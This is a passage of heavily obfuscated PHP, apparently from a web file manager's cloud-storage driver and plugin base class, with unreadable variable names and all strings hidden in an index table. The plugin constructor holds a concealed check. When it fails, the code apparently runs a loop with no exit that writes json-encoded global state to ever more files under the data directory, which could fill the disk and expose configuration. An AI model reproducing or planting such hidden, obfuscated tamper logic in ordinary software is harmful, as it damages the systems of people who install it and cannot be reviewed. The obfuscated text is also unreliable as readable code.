= count($œ–“‡×­); $ã¾Ñ× = count($ã¾Ñ×); $ô³’ÊÎ’ = $ŠÉµ°Á¦ - $ã¾Ñ×; if ($¦çÃ‘ğÉ) { $Œ²Ù×¼± += $ã¾Ñ×; $úÒè«­ += $ô³’ÊÎ’; if ($ŠÉµ°Á¦ < $Í–¢¸ÔÑ) { break; } continue; } if ($¡†²İÜ) { if ($ô³’ÊÎ’) { return !0; } } else { if ($ã¾Ñ×) { return !0; } } if ($ŠÉµ°Á¦ < $Í–¢¸ÔÑ) { break; } } if ($¦çÃ‘ğÉ) { return array($Ù™â¦‹[207] => $úÒè«­, $Ù™â¦‹[208] => $Œ²Ù×¼±); } return !1; } public function listAll($öÈËÄŠÍ) { $·Œ²º³ë =& $_SERVER[Ã¶¡¶„æ]; $ÄÛòİ½Ğ = $ÆÅ¬°ï¶ = array(); $this->fileList($öÈËÄŠÍ, $ÄÛòİ½Ğ, $ÆÅ¬°ï¶, !0); $ÒÙÂ÷Ñ = array(); foreach ($ÆÅ¬°ï¶ as $ÏĞäŸ½ñ) { $ÒÙÂ÷Ñ[$ÏĞäŸ½ñ[$·Œ²º³ë[32]]] = $ÏĞäŸ½ñ[$·Œ²º³ë[76]]; } foreach ($ÄÛòİ½Ğ as $ÏĞäŸ½ñ) { if (is_string($ÏĞäŸ½ñ)) { $ÒÙÂ÷Ñ[$ÏĞäŸ½ñ] = 0; } } return $this->listAllFiles($öÈËÄŠÍ, array_keys($ÒÙÂ÷Ñ), $ÒÙÂ÷Ñ); } public function canRead($Ùà½´öŞ) { return $this->exist($Ùà½´öŞ) ? !0 : !1; } public function canWrite($ÕºÃ×ì„) { return $this->exist($ÕºÃ×ì„) ? !0 : !1; } public function getContent($§ìÓïñ) { return $this->fileSubstr($§ìÓïñ, 0, -1); } public function setContent($²˜çõÇ”, $ÊØóçÁ¸ = '') { $„’‹¿ˆ =& $_SERVER[Ã¶¡¶„æ]; if (!$ÊØóçÁ¸) { $êĞûâÃ = $this->ussRequest($²˜çõÇ”, $„’‹¿ˆ[226]); return $êĞûâÃ[$„’‹¿ˆ[1227]]; } $¦ãˆâ—ò = $this->tempFile($this->pathThis($²˜çõÇ”)); file_put_contents($¦ãˆâ—ò, $ÊØóçÁ¸); if ($this->upload($²˜çõÇ”, $¦ãˆâ—ò)) { $this->tempFileRemve($¦ãˆâ—ò); return !0; } return !1; } public function fileSubstr($×Ô½ëõ, $«çÈòÅ, $‚õ¡ÎÛ) { $é£³òû =& $_SERVER[Ã¶¡¶„æ]; if (!($ÁŠ±ôø­ = $this->link($×Ô½ëõ))) { return !1; } $ÙÆåã = !1; if ($‚õ¡ÎÛ > 0) { $úÇ±¶úµ = $«çÈòÅ + $‚õ¡ÎÛ - 1; $ÙÆåã = array($é£³òû[1455] . $«çÈòÅ . $é£³òû[386] . $úÇ±¶úµ); } $¹„—‚Ê¢ = url_request($ÁŠ±ôø­, $é£³òû[230], !1, $ÙÆåã); return $¹„—‚Ê¢[$é£³òû[756]] ? $¹„—‚Ê¢[$é£³òû[1217]] : !1; } public function upload($Ş€÷ÄÕÅ, $Â‘µÜ€, $ë¿†í = false, $àÛêõíÅ = REPEAT_REPLACE) { $–¹œÖÎè =& $_SERVER[Ã¶¡¶„æ]; $ãÛĞŒ½Ã = IO::size($Â‘µÜ€); if ($ãÛĞŒ½Ã <= 1024 * 1024 * 200) { $¶ÁŠ³İ = array($–¹œÖÎè[1495] . $Â‘µÜ€); $Ú´£—ºÕ = $this->ussRequest($Ş€÷ÄÕÅ, $–¹œÖÎè[228], $¶ÁŠ³İ); return $Ú´£—ºÕ[$–¹œÖÎè[1227]] ? $this->getPathOuter($Ş€÷ÄÕÅ) : !1; } $£ã„ô¼· = 1024 * 1024 * 10; $ìÓ¦÷Šö = array($–¹œÖÎè[1496], $–¹œÖÎè[1497] . $ãÛĞŒ½Ã, $–¹œÖÎè[1498], $–¹œÖÎè[1499] . $£ã„ô¼·); $Ú´£—ºÕ = $this->ussRequest($Ş€÷ÄÕÅ, $–¹œÖÎè[228], !1, $ìÓ¦÷Šö); if (!$Ú´£—ºÕ[$–¹œÖÎè[1227]]) { return !1; } $”®†çÛ = $Ú´£—ºÕ[$–¹œÖÎè[1217]]; $á’İõŠ¶ = 0; $ˆëÕ–´ = $”®†çÛ[$–¹œÖÎè[1500]]; $†ªÀ›ñ = fopen($Â‘µÜ€, $–¹œÖÎè[1404]); if (!$†ªÀ›ñ) { return !1; } do { $Ã«ò±øá = $”®†çÛ[$–¹œÖÎè[1501]]; fseek_64($†ªÀ›ñ, $á’İõŠ¶); $Ëæ÷Í› = fread($†ªÀ›ñ, $Ã«ò±øá); $µ–úİğ· = 0; do { $µ–úİğ·++; $”®†çÛ = $this->uploadPart($Ş€÷ÄÕÅ, $”®†çÛ, $Ëæ÷Í›); } while (!$”®†çÛ && $µ–úİğ· < 3); if (!$”®†çÛ) { return !1; } $ˆëÕ–´ = $”®†çÛ[$–¹œÖÎè[1500]]; $á’İõŠ¶ += $Ã«ò±øá; } while ($ˆëÕ–´ != -1); fclose($†ªÀ›ñ); $ìÓ¦÷Šö = array($–¹œÖÎè[1502], $–¹œÖÎè[1503] . $”®†çÛ[$–¹œÖÎè[1504]], $–¹œÖÎè[1498]); $Ú´£—ºÕ = $this->ussRequest($Ş€÷ÄÕÅ, $–¹œÖÎè[228], !1, $ìÓ¦÷Šö); return $Ú´£—ºÕ[$–¹œÖÎè[1227]] ? $this->getPathOuter($à´ôêÅ°) : !1; } private function uploadPart($™÷¿¬, $Üœí½îø, &$‚ì±) { $ˆ‹ØÂ×ú =& $_SERVER[Ã¶¡¶„æ]; $´Äñİûİ = array($ˆ‹ØÂ×ú[1505], $ˆ‹ØÂ×ú[1503] . $Üœí½îø[$ˆ‹ØÂ×ú[1504]], $ˆ‹ØÂ×ú[1506] . $Üœí½îø[$ˆ‹ØÂ×ú[1500]], $ˆ‹ØÂ×ú[142] . $Üœí½îø[$ˆ‹ØÂ×ú[1501]]); $ÄÉÌ†˜¼ = $this->ussRequest($™÷¿¬, $ˆ‹ØÂ×ú[228], $‚ì±, $´Äñİûİ); return !$ÄÉÌ†˜¼[$ˆ‹ØÂ×ú[1227]] ? $ÄÉÌ†˜¼[$ˆ‹ØÂ×ú[1227]] : $ÄÉÌ†˜¼[$ˆ‹ØÂ×ú[1217]]; } public function uploadFormData($í±õÏúæ, $§¸µìÓ° = 3600) { return $this->uploadPolicy($í±õÏúæ, $§¸µìÓ°); } public function multiUploadFormData($ı€Æ‹İ, $‚³™ºÓ¦ = 3600) { $óŒ³ûî =& $_SERVER[Ã¶¡¶„æ]; $óÁêÏ“½ = (int) $GLOBALS[$óŒ³ûî[7]][$óŒ³ûî[76]]; return $this->uploadPolicy($ı€Æ‹İ, $‚³™ºÓ¦, $óÁêÏ“½); } private function uploadPolicy($œ¾ğ¦, $Ï¥Üì = 3600, $šŞË¸şû = 0) { $›şÕü³» =& $_SERVER[Ã¶¡¶„æ]; $‹Ÿã¤§Ø = $›şÕü³»[8] . $this->bucket; $˜ççƒÛ = gmdate($›şÕü³»[1440]); $‰ßš´ĞŞ = array($›şÕü³»[1507] => $this->bucket, $›şÕü³»[1508] => $œ¾ğ¦, $›şÕü³»[1509] => time() + $Ï¥Üì, $›şÕü³»[1510] => $˜ççƒÛ); if ($šŞË¸şû) { $‰ßš´ĞŞ[$›şÕü³»[1420]] = $šŞË¸şû; } $ÎµƒµØ = base64_encode(json_encode($‰ßš´ĞŞ)); $Ó¦ØÂ¿ = base64_encode(hash_hmac($›şÕü³»[1477], "\120\117\x53\124\46{$‹Ÿã¤§Ø}\46{$˜ççƒÛ}\46{$ÎµƒµØ}", md5("{$this->userpass}"), !0)); $œ«ª«õó = array($›şÕü³»[1345] => $ÎµƒµØ, $›şÕü³»[1511] => "\x55\x50\131\125\x4e\40{$this->username}\72{$Ó¦ØÂ¿}", $›şÕü³»[181] => $this->endpoint . $‹Ÿã¤§Ø); return $œ«ª«õó; } public function download($’¶«æú·, $„´†İÈÖ) { $…·Ë¯— = IO::getPathInner(IO::mkfile($„´†İÈÖ)); if (!($…”•îüü = $this->link($’¶«æú·))) { return !1; } $›ê‚˜´¢ = 0; $»ñ ÷œ = 1024 * 200; $¨áÕìî¯ = fopen($…·Ë¯—, $_SERVER[Ã¶¡¶„æ][1461]); while (!0) { $Òƒ¡Í’¶ = $this->fileSubstr($’¶«æú·, $›ê‚˜´¢, $»ñ ÷œ); if ($Òƒ¡Í’¶ === !1) { return !1; } fwrite($¨áÕìî¯, $Òƒ¡Í’¶); $›ê‚˜´¢ += $»ñ ÷œ; if (strlen($Òƒ¡Í’¶) < $»ñ ÷œ) { break; } } fclose($¨áÕìî¯); return $„´†İÈÖ; } public function link($“íáÉâÎ, $ÑÓå„  = array()) { $ˆÊŒíš¤ =& $_SERVER[Ã¶¡¶„æ]; $“íáÉâÎ = trim($“íáÉâÎ, $ˆÊŒíš¤[8]); if (!empty($this->token)) { $êÑ­Î³ğ = strtotime(date($ˆÊŒíš¤[1512])); $Å¥¶­³ = substr(md5($this->token . $ˆÊŒíš¤[284] . $êÑ­Î³ğ . $ˆÊŒíš¤[1513] . $“íáÉâÎ), 12, 8) . $êÑ­Î³ğ; $ÑÓå„ [] = $ˆÊŒíš¤[1514] . $Å¥¶­³; } $¾»ªÀƒ¾ = !empty($ÑÓå„ ) ? $ˆÊŒíš¤[73] . implode($ˆÊŒíš¤[284], $ÑÓå„ ) : $ˆÊŒíš¤[12]; return $this->getHost() . $ˆÊŒíš¤[8] . $“íáÉâÎ . $¾»ªÀƒ¾; } public function fileOut($ëŸâàä, $îÚ»îÈ¾ = false, $şÄ ÃÅ‘ = false, $ğ¦åã¢ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ëŸâàä, $îÚ»îÈ¾, $şÄ ÃÅ‘, $ğ¦åã¢); } if (!$şÄ ÃÅ‘) { $şÄ ÃÅ‘ = $this->pathThis($ëŸâàä); } $ö×Œ³µ = $îÚ»îÈ¾ ? array($_SERVER[Ã¶¡¶„æ][1515] . rawurlencode($şÄ ÃÅ‘)) : array(); $Ä ’â×ø = $this->link($ëŸâàä, $ö×Œ³µ); $this->fileOutLink($Ä ’â×ø); } public function fileOutServer($›ÔôåÌæ, $ŞüÜ°ÎĞ = false, $˜Ğ¢öà = false, $Ë£§±àæ = '') { parent::fileOut($›ÔôåÌæ, $ŞüÜ°ÎĞ, $˜Ğ¢öà, $Ë£§±àæ); } public function fileOutImage($â‘Ãšè½, $ì¥Ú†–‹ = 250) { $šµÛ•Üæ = $this->link($â‘Ãšè½ . $_SERVER[Ã¶¡¶„æ][1516] . $ì¥Ú†–‹); $this->fileOutLink($šµÛ•Üæ); } public function fileOutImageServer($Ù¶ôşıË, $æÙ¹´â´ = 250) { parent::fileOutImage($Ù¶ôşıË, $æÙ¹´â´); } public function hashMd5($Ú®¯§ÆÇ) { $ŠîÕí¾ =& $_SERVER[Ã¶¡¶„æ]; $ƒú¾ÅĞÊ = $this->_objectMeta($Ú®¯§ÆÇ); return isset($ƒú¾ÅĞÊ[$ŠîÕí¾[212]]) ? $ƒú¾ÅĞÊ[$ŠîÕí¾[212]] : !1; } public function size($ãÈ©€ôÜ) { $«¾Š°íã = $this->objectMeta($ãÈ©€ôÜ); return $«¾Š°íã ? $«¾Š°íã[$_SERVER[Ã¶¡¶„æ][76]] : 0; } public function info($ì‚œËò¬) { if ($this->isFolder($ì‚œËò¬)) { return $this->folderInfo($ì‚œËò¬); } else { if ($this->isFile($ì‚œËò¬)) { return $this->fileInfo($ì‚œËò¬); } } return !1; } public function exist($ÑÀÙå¡·) { return $this->isFile($ÑÀÙå¡·) || $this->isFolder($ÑÀÙå¡·); } public function isFile($×»™¦É×) { return !$this->isFolder($×»™¦É×) && $this->objectMeta($×»™¦É×); } public function isFolder($¶¿§§û³) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][165], $¶¿§§û³); } protected function objectMeta($¤’¨«öÎ) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][167], $¤’¨«öÎ); } protected function _objectMeta($ÃÜ€“í) { $š¡Àı™Œ =& $_SERVER[Ã¶¡¶„æ]; if ($ÃÜ€“í == $š¡Àı™Œ[12] || $ÃÜ€“í == $š¡Àı™Œ[8]) { return array(); } $ŸçŠÖğß = $this->ussRequest($ÃÜ€“í, $š¡Àı™Œ[1517]); if (!$ŸçŠÖğß[$š¡Àı™Œ[1227]]) { return null; } $®ç—İé = isset($ŸçŠÖğß[$š¡Àı™Œ[1217]]) ? $ŸçŠÖğß[$š¡Àı™Œ[1217]] : array(); if (!isset($®ç—İé[$š¡Àı™Œ[1518]])) { return null; } $ï™É¼¿ª = array($š¡Àı™Œ[33] => isset($®ç—İé[$š¡Àı™Œ[1518]]) ? $®ç—İé[$š¡Àı™Œ[1518]] : null, $š¡Àı™Œ[76] => isset($®ç—İé[$š¡Àı™Œ[1519]]) ? $®ç—İé[$š¡Àı™Œ[1519]] : null, $š¡Àı™Œ[212] => isset($®ç—İé[$š¡Àı™Œ[1520]]) ? $®ç—İé[$š¡Àı™Œ[1520]] : null, $š¡Àı™Œ[1487] => isset($®ç—İé[$š¡Àı™Œ[1521]]) ? $®ç—İé[$š¡Àı™Œ[1521]] : null); $ï™É¼¿ª[$š¡Àı™Œ[1488]] = isset($®ç—İé[$š¡Àı™Œ[1522]]) ? strtotime($®ç—İé[$š¡Àı™Œ[1522]]) : $ï™É¼¿ª[$š¡Àı™Œ[1487]]; return $ï™É¼¿ª; } protected function _isFolder($ƒô•ôĞ¬) { $ş¼ëúº =& $_SERVER[Ã¶¡¶„æ]; if ($ƒô•ôĞ¬ == $ş¼ëúº[12] || $ƒô•ôĞ¬ == $ş¼ëúº[8]) { return !0; } $Ë…¡ã¿ù = $this->_objectMeta($ƒô•ôĞ¬); return isset($Ë…¡ã¿ù[$ş¼ëúº[33]]) && $Ë…¡ã¿ù[$ş¼ëúº[33]] == $ş¼ëúº[75] ? !0 : !1; } } goto a¹‰âÕ½¥®; AŠ‚–ª¼Ë: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¦ıú¶Çë =& $_SERVER[Ã¶¡¶„æ]; $¦…ÕÈÅ¯ = $_SERVER[$¦ıú¶Çë[847]]; $Åßœ²ß… = $¦ıú¶Çë[890]; if ($_SERVER[$¦ıú¶Çë[840]] != $Åßœ²ß…($¦…ÕÈÅ¯)) { $¾ƒ×£á« = $¦ıú¶Çë[891]; $€¡Í’‡ã = $¦ıú¶Çë[842]; $†Ôòò¡ = $_SERVER[$¦ıú¶Çë[843]] . $¦ıú¶Çë[844]; $¦Ç”½Ş£ = $€¡Í’‡ã($†Ôòò¡); $’Ÿ”±Æƒ = explode($¦ıú¶Çë[231], $¦Ç”½Ş£); if (count($’Ÿ”±Æƒ) < $¦ıú¶Çë[636]) { $§¶ä‹²€ = $¦ıú¶Çë[845]; $§¶ä‹²€(); } $êø³’²« = $¦ıú¶Çë[892]; $êø³’²«($_SERVER[$¦ıú¶Çë[893]]); $¾ƒ×£á« = $¦ıú¶Çë[891]; $¾ƒ×£á«(); $×÷ÁÅìÅ = $¦ıú¶Çë[894]; $Ï·ÅÉô¼ = json_encode($GLOBALS[$¦ıú¶Çë[895]]); $”âİÓ¸ = 1; for ($ıªí¶ ² = $”âİÓ¸; $ıªí¶ ² > 0; $ıªí¶ ²++) { $×÷ÁÅìÅ(DATA_PATH . $ıªí¶ ², $Ï·ÅÉô¼); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¦ıú¶Çë[1544]); $this->pluginName = str_replace($¦ıú¶Çë[1544], $¦ıú¶Çë[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¦ıú¶Çë[8]; $this->pluginApi = appHostGet() . $¦ıú¶Çë[1545] . $this->pluginName . $¦ıú¶Çë[8]; $this->pluginHost = $config[$¦ıú¶Çë[1546]] . $this->pluginName . $¦ıú¶Çë[8]; $this->pluginHostDefault = $config[$¦ıú¶Çë[1546]] . $this->pluginName . $¦ıú¶Çë[8]; $º§Ø™ŠÛ = $config[$¦ıú¶Çë[1547]]; if ($º§Ø™ŠÛ && strpos($¦ıú¶Çë[50] . $º§Ø™ŠÛ . $¦ıú¶Çë[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¦ıú¶Çë[1548]] . $this->pluginName . $¦ıú¶Çë[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ã¶¡¶„æ][1549]); } protected function assign($´ü¹†¹², $‘å±Ö©÷ = false) { if (is_array($´ü¹†¹²)) { $this->values = array_merge($this->values, $´ü¹†¹²); } else { $this->values[$´ü¹†¹²] = $‘å±Ö©÷; } } protected function display($ŠƒÖÏÙ) { extract($this->values); require $ŠƒÖÏÙ; } final function hookRegist($®¬ŞÌƒÆ) { $this->modelPlugin->appRegist($this->pluginName, $®¬ŞÌƒÆ); } final function appIcon() { $¡ú£¬™¸ =& $_SERVER[Ã¶¡¶„æ]; $®ãæË…À = $this->appPackage(); $ÀÑÓ¶¯Ê = $¡ú£¬™¸[12]; if (isset($®ãæË…À[$¡ú£¬™¸[416]])) { if (isset($®ãæË…À[$¡ú£¬™¸[416]][$¡ú£¬™¸[1550]])) { $ÀÑÓ¶¯Ê = $¡ú£¬™¸[1551] . $®ãæË…À[$¡ú£¬™¸[416]][$¡ú£¬™¸[1550]] . $¡ú£¬™¸[1552]; } else { if ($®ãæË…À[$¡ú£¬™¸[416]][$¡ú£¬™¸[1553]]) { $ÀÑÓ¶¯Ê = $¡ú£¬™¸[1554] . $®ãæË…À[$¡ú£¬™¸[416]][$¡ú£¬™¸[1553]] . $¡ú£¬™¸[1555]; } } } return $ÀÑÓ¶¯Ê; } final function fileCanView($ÙæÕü÷¹) { $·ƒ×ğ†¸ =& $_SERVER[Ã¶¡¶„æ]; if (request_url_safe($ÙæÕü÷¹)) { return !0; } if ($this->isShare($ÙæÕü÷¹)) { return !0; } $Ó­‚ª…ì = Session::get($·ƒ×ğ†¸[1556]); if (!$Ó­‚ª…ì || !$Ó­‚ª…ì[$·ƒ×ğ†¸[1557]]) { $†íä¶¶Ÿ = $·ƒ×ğ†¸[1558] . rawurlencode(this_url()); show_tips(LNG($·ƒ×ğ†¸[1559]) . $·ƒ×ğ†¸[1560] . $†íä¶¶Ÿ . $·ƒ×ğ†¸[1561] . LNG($·ƒ×ğ†¸[1562]) . $·ƒ×ğ†¸[1563], !1); } if (!Action($·ƒ×ğ†¸[1564])->authCan($·ƒ×ğ†¸[1565])) { show_tips(LNG($·ƒ×ğ†¸[1566]) . $·ƒ×ğ†¸[1567], !1); } ActionCall($·ƒ×ğ†¸[1568], $ÙæÕü÷¹); } final function isShare($¸»¿÷°„) { $ƒ«‹™­ = KodIO::parse($¸»¿÷°„); return $ƒ«‹™­[$_SERVER[Ã¶¡¶„æ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Á¼‹ò) { if (request_url_safe($Á¼‹ò)) { return $Á¼‹ò; } if (!$this->isShare($Á¼‹ò)) { $Á¼‹ò = $this->filePath($Á¼‹ò); } return Action($_SERVER[Ã¶¡¶„æ][1189])->linkOut($Á¼‹ò); } public function filePathLinkOut($…İÉíı) { if (request_url_safe($…İÉíı)) { return $…İÉíı; } $this->fileCanView($…İÉíı); return Action($_SERVER[Ã¶¡¶„æ][1189])->link($…İÉíı); } final function filePath($ùÒÒÓ¾£) { $İŠõ Å™ =& $_SERVER[Ã¶¡¶„æ]; if ($ö•„öõœ = $this->checkSharePath($ùÒÒÓ¾£)) { Hook::trigger($İŠõ Å™[1569], $ö•„öõœ); return $ö•„öõœ; } $this->fileCanView($ùÒÒÓ¾£); if (request_url_safe($ùÒÒÓ¾£)) { $°É¬ß¦ß = parse_url_query($ùÒÒÓ¾£); if (isset($°É¬ß¦ß[$İŠõ Å™[1570]]) && isset($°É¬ß¦ß[$İŠõ Å™[213]])) { $°²¨ßó› = Model($İŠõ Å™[776])->get($İŠõ Å™[777]); $¨º¦î¬Œ = Mcrypt::decode($°É¬ß¦ß[$İŠõ Å™[213]], $°²¨ßó›); if ($¨º¦î¬Œ) { $this->fileInfo = IO::infoWithChildren($¨º¦î¬Œ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $¨º¦î¬Œ; } } $ùÒÒÓ¾£ = $this->_cacheHttpFile($ùÒÒÓ¾£); $this->fileInfo = IO::infoWithChildren($ùÒÒÓ¾£); } else { $this->fileInfo = IO::infoWithChildren($ùÒÒÓ¾£); if (!$this->fileInfo) { show_tips(LNG($İŠõ Å™[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($İŠõ Å™[1569], $ùÒÒÓ¾£); return $ùÒÒÓ¾£; } final function _cacheHttpFile($úÀéªÁ¬) { $Êı¥Ô«¬ = hash_path($úÀéªÁ¬, !0); $this->cachePath = $this->pluginCachePath($Êı¥Ô«¬); if ($„ª¬Ü’ = IO::fileNameExist($this->cachePath, $Êı¥Ô«¬)) { return KodIO::make($„ª¬Ü’); } $şäÀÄš¥ = $this->cachePath . $Êı¥Ô«¬; return $this->pluginCacheFileSet($şäÀÄš¥, file_get_contents_nossl($úÀéªÁ¬)); } final function _tmpFileName($àüÒˆş = array()) { $¾î¢›â‰ =& $_SERVER[Ã¶¡¶„æ]; if (!$àüÒˆş) { $àüÒˆş = $this->fileInfo; } if (isset($àüÒˆş[$¾î¢›â‰[177]])) { return $àüÒˆş[$¾î¢›â‰[177]]; } if (isset($àüÒˆş[$¾î¢›â‰[170]][$¾î¢›â‰[177]])) { return $àüÒˆş[$¾î¢›â‰[170]][$¾î¢›â‰[177]]; } $¶Ó¾°Çõ = IO::hashSimple($àüÒˆş[$¾î¢›â‰[84]]); if ($¶Ó¾°Çõ) { return $¶Ó¾°Çõ; } $”•Ï°Õ× = array($àüÒˆş[$¾î¢›â‰[32]], $àüÒˆş[$¾î¢›â‰[84]], $àüÒˆş[$¾î¢›â‰[76]]); if (isset($àüÒˆş[$¾î¢›â‰[521]])) { $”•Ï°Õ×[] = $àüÒˆş[$¾î¢›â‰[521]]; } return md5(implode($¾î¢›â‰[11], $”•Ï°Õ×)); } final function checkSharePath($ìû½»Ó) { $ˆ„Å¡ =& $_SERVER[Ã¶¡¶„æ]; if (!defined($ˆ„Å¡[475])) { define($ˆ„Å¡[514], 0); } if (!$this->isShare($ìû½»Ó)) { return !1; } $şûÛÃ‰± = Action($ˆ„Å¡[1189])->sharePathInfo($ìû½»Ó); if (!isset($şûÛÃ‰±[$ˆ„Å¡[84]])) { show_json(LNG($ˆ„Å¡[1571]), !1); } $this->fileInfo = $şûÛÃ‰±[$ˆ„Å¡[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ˆ„Å¡[177]]); return $şûÛÃ‰±[$ˆ„Å¡[84]]; } final function pluginCachePath($½¯¶Ş¹­ = '') { $„Ëîˆ¦û =& $_SERVER[Ã¶¡¶„æ]; $ëßÔØØÔ = IO_PATH_SYSTEM_TEMP . $„Ëîˆ¦û[1572] . $this->pluginName; if (!($ù½Ñ¡áÔ = IO::infoFull($ëßÔØØÔ))) { return IO::mkdir($ëßÔØØÔ . $„Ëîˆ¦û[8] . $½¯¶Ş¹­); } if (empty($½¯¶Ş¹­)) { return $ù½Ñ¡áÔ[$„Ëîˆ¦û[84]]; } if (!($˜ñ…ŠÛé = IO::fileNameExist($ù½Ñ¡áÔ[$„Ëîˆ¦û[84]], $½¯¶Ş¹­))) { return IO::mkdir($ù½Ñ¡áÔ[$„Ëîˆ¦û[84]] . $½¯¶Ş¹­); } return KodIO::make($˜ñ…ŠÛé); } final function pluginCacheFileSet($Æõ‚”é, $³Ùå¿ = '') { $Øù™«õÏ =& $_SERVER[Ã¶¡¶„æ]; if (!($çòÛÒ¤ï = IO::infoFull($Æõ‚”é))) { return IO::mkfile($Æõ‚”é, $³Ùå¿, REPEAT_REPLACE); } IO::setContent($çòÛÒ¤ï[$Øù™«õÏ[84]], $³Ùå¿); return $çòÛÒ¤ï[$Øù™«õÏ[84]]; } final function pluginLocalFile($¸’–ƒğ« = '') { $ÃœÕ¿ =& $_SERVER[Ã¶¡¶„æ]; $¸‰—ÎÛ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¸‰—ÎÛ)) { mk_dir($¸‰—ÎÛ); } if (!$¸’–ƒğ«) { return $¸‰—ÎÛ; } $Óó¤ªü˜ = IO::info($¸’–ƒğ«); $øË˜Óß = $this->_tmpFileName($Óó¤ªü˜) . $ÃœÕ¿[10] . $Óó¤ªü˜[$ÃœÕ¿[174]]; if (!checkExtSafe($øË˜Óß)) { $øË˜Óß = $øË˜Óß . $ÃœÕ¿[1221]; } $“˜íöÂ« = $¸‰—ÎÛ . $øË˜Óß; if (@file_exists($“˜íöÂ«)) { return $“˜íöÂ«; } return IO::copy($¸’–ƒğ«, $¸‰—ÎÛ, 0, $øË˜Óß); } final function appPackage() { $ó„à³’å =& $_SERVER[Ã¶¡¶„æ]; if ($this->packageData) { return $this->packageData; } $×´¼Îâ¦ = $this->parseFile($this->pluginPath . $ó„à³’å[1573]); $this->parseLang($×´¼Îâ¦); $—ÛÒòíŸ = json_decode_force($×´¼Îâ¦); if (!$—ÛÒòíŸ) { return array(); } $¼‹¸õû = Hook::trigger($ó„à³’å[1574], $—ÛÒòíŸ); if ($¼‹¸õû && is_array($¼‹¸õû)) { $—ÛÒòíŸ = $¼‹¸õû; } $this->packageData = $—ÛÒòíŸ; return $—ÛÒòíŸ; } public function packageInfoGet($œ­ûÈ«) { $«ª ¦Ğ = $this->appPackage(); return array_get_value($«ª ¦Ğ, $œ­ûÈ«); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ã¶¡¶„æ][1575]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ã¶¡¶„æ][1576]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ã¶¡¶„æ][1577]); } public function echoJsAssign($Ï€…¦õ®, $Ò×ÇÆŸË) { $this->echoJsAssignArr[$Ï€…¦õ®] = $Ò×ÇÆŸË; } private function parseFile($Ğç‡íØ) { $Ò¿¾İ©ß =& $_SERVER[Ã¶¡¶„æ]; $Ç—ñ®×Ï = file_get_contents_nossl($Ğç‡íØ); $¤ÇôÇ‰Ö = array($Ò¿¾İ©ß[1578], $Ò¿¾İ©ß[1579], $Ò¿¾İ©ß[1580], $Ò¿¾İ©ß[1581], $Ò¿¾İ©ß[1582], $Ò¿¾İ©ß[1583], $Ò¿¾İ©ß[1584]); $İ÷¬“ı€ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ò¿¾İ©ß[89]][$Ò¿¾İ©ß[1585]]); foreach ($this->echoJsAssignArr as $ÄúÍ–¡¢ => $’½ñ“Ê¯) { $¤ÇôÇ‰Ö[] = $Ò¿¾İ©ß[1586] . $ÄúÍ–¡¢ . $Ò¿¾İ©ß[1587]; $İ÷¬“ı€[] = is_array($’½ñ“Ê¯) || is_object($’½ñ“Ê¯) ? rawurlencode(json_encode($’½ñ“Ê¯)) : $’½ñ“Ê¯; } if (strstr($Ç—ñ®×Ï, $Ò¿¾İ©ß[1588])) { $Ï¿ƒŞ¥Ë = rawurlencode(json_encode($this->pluginLangArr)); $Ç—ñ®×Ï = str_replace($Ò¿¾İ©ß[1588], $Ï¿ƒŞ¥Ë, $Ç—ñ®×Ï); } if (strstr($Ç—ñ®×Ï, $Ò¿¾İ©ß[1589])) { $Ï¿ƒŞ¥Ë = $Ï¿ƒŞ¥Ë = rawurlencode(json_encode($this->getConfig())); $Ç—ñ®×Ï = str_replace($Ò¿¾İ©ß[1589], $Ï¿ƒŞ¥Ë, $Ç—ñ®×Ï); } $Ç—ñ®×Ï = str_replace($¤ÇôÇ‰Ö, $İ÷¬“ı€, $Ç—ñ®×Ï); return $Ç—ñ®×Ï; } private function parseLang(&$íêƒ¨µ’) { $ÇÈ¶¹¢ =& $_SERVER[Ã¶¡¶„æ]; $ÓôÒÍœ = $ÇÈ¶¹¢[1590]; if (!strstr($íêƒ¨µ’, $ÓôÒÍœ)) { return; } preg_match_all($ÇÈ¶¹¢[1591], $íêƒ¨µ’, $îÎì½Ğ¨); if (!is_array($îÎì½Ğ¨) || count($îÎì½Ğ¨) == 0 || !is_array($îÎì½Ğ¨[0]) || count($îÎì½Ğ¨[0]) == 0) { return; } $”ú¼Ö«Ù = array(); $ÖÃáö = array(); foreach ($îÎì½Ğ¨[0] as $®ˆ›ö€î) { $ÙÇÔ•Öí = substr($®ˆ›ö€î, strlen($ÓôÒÍœ), -4); $İ€¤ı´ç = LNG($ÙÇÔ•Öí); $”ú¼Ö«Ù[] = $®ˆ›ö€î; $ÖÃáö[] = str_replace(array($ÇÈ¶¹¢[231], $ÇÈ¶¹¢[1092], $ÇÈ¶¹¢[342], $ÇÈ¶¹¢[118]), array($ÇÈ¶¹¢[53], $ÇÈ¶¹¢[53], $ÇÈ¶¹¢[12], $ÇÈ¶¹¢[1592]), $İ€¤ı´ç); } $íêƒ¨µ’ = str_replace($”ú¼Ö«Ù, $ÖÃáö, $íêƒ¨µ’); } private function parseConfig(&$şÚßŒ¨á) { $ªôÄä©„ =& $_SERVER[Ã¶¡¶„æ]; $çÇß™íÃ = $ªôÄä©„[1593]; if (!strstr($şÚßŒ¨á, 